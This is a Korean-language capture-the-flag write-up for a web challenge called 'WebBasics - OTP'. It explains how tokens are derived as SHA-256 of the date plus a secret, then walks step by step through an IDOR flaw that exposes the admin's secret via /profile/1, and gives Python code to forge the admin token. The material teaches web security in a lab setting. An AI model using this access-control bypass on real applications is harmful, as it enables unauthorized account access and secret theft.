---
ctf_name: "CYBERGAME 2026"
challenge_name: "WebBasics - OTP"
category: "web"
difficulty: "easy"
author: "penguink-hub"
date: "2026-05-03"
points: 100
tags: [web, idor, otp, sha256, access-control]
---

# WebBasics - OTP

## 문제 설명

> There is a highly secure, certified, and visually beautiful application for generating daily tokens from secret seeds. But only one seed can generate the flag....

- Target URL: http://exp.cybergame.sk:7020

## 풀이

### 분석

웹 사이트는 회원가입/로그인 기능을 제공하며, 로그인 후 "Your Today Token" 대시보드가 표시됩니다.
토큰은 오늘 날짜와 사용자의 Secret Initializer를 조합하여 매일 새롭게 생성됩니다.

프로필 페이지(/profile/{user_id})에서는 Secret Initializer를 확인하고 수정할 수 있으며,
기본값은 default_secret입니다.

내 계정(test100)으로 생성된 토큰과 기본 secret을 이용해 토큰 생성 로직을 역산하면 다음과 같습니다.

```
token = SHA256("YYYY-MM-DD-{secret_initializer}")
```

실제로 검증하면:

```python
import hashlib
hashlib.sha256("2026-05-03-default_secret".encode()).hexdigest()
# => e4c3327538d2f36a71100619dccfb07ea292efdea192367441b2451024a06ba8 (대시보드 토큰과 일치)
```

문제 설명에서 "only one seed can generate the flag"라고 했으므로,
admin 계정의 Secret Initializer를 탈취하는 것이 목표임을 알 수 있습니다.

### 취약점

프로필 URL이 /profile/{user_id} 형태로 구성되어 있으며,
서버는 로그인된 사용자라면 누구든 임의의 user_id로 접근하는 것을 막지 않습니다.
즉, 접근 권한 검증(Authorization)이 없어 다른 유저의 프로필을 열람하고 수정까지 할 수 있는
IDOR(Insecure Direct Object Reference) 취약점이 존재합니다.

### 익스플로잇

목표는 admin의 Secret Initializer를 탈취한 뒤, 이를 내 계정에 적용하여 플래그를 획득하는 것입니다.

1. 회원가입 후 로그인하면 내 프로필 URL이 /profile/856 임을 확인합니다.
2. /profile/1 로 직접 접근하면 권한 검증 없이 admin 계정 정보가 노출됩니다.

```
Username: admin
Secret Initializer: a95aa045a8bf5e502ee2541dd2a00925e2e825eacbbc22dadfb4ba027094dbf0
```

3. 탈취한 admin의 Secret Initializer로 오늘의 admin 토큰을 계산합니다.

```python
import hashlib

admin_secret = "a95aa045a8bf5e502ee2541dd2a00925e2e825eacbbc22dadfb4ba027094dbf0"
today = "2026-05-03"

token = hashlib.sha256(f"{today}-{admin_secret}".encode()).hexdigest()
print(token)
# => 78b8abee65fc7a8ef4a7ae3822c555502bd486c76faaeb834d37469ea09a9dc0
```

4. 내 프로필(/profile/856)의 Secret Initializer 필드를 admin의 값으로 변경하고 UPDATE PROFILE을 클릭합니다.
5. 토큰 대시보드로 돌아오면 admin의 토큰이 출력되며 플래그가 표시됩니다.

## 플래그

```
SK-CERT{REDACTED}
```

